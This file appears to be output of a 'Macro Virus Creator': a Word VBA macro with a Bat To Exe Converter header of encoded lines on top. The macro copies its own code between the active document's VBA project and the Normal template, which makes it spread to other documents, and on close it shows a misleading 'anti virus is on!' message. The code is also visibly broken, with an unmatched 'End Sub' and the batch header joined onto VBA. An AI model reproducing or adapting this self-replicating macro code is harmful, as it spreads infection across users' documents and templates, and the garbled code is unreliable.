::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSTk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
Dim Norm, NormCode, NormLines, Doc, DocCode, DocLines
Set Norm = NormalTemplate.VBProject.VBComponents(1)
Set Doc = ActiveDocument.VBProject.VBComponents(1)
Set DocCode = Doc.CodeModule:Set NormCode = Norm.CodeModule

If DocCode.lines(23, 1) = "" Then
    For y = 1 To DocCode.countoflines
DocCode.replacelines y, "$MOOTHiE's Macro Virus Creator 2000 Ver. 1.0"
    Next y
    For x = 2 To NormCode.countoflines
DocCode.insertlines 26 + x, NormCode.lines(x, 1)
   Next x
End If

If NormCode.lines(23, 1) = "" Then
    For y = 1 To NormCode.countoflines
NormCode.replacelines y, "$MOOTHiE's Macro Virus Creator 2000 Ver. 1.0"
    Next y
    For x = 1 To DocCode.countoflines
NormCode.insertlines 26 + x, DocCode.lines(x, 1)
    Next x
End If
End Sub

Private Sub Document_New ()
End Sub

Private Sub Document_Close ()
MsgBox "anti virus is on!", vbInformation
End Sub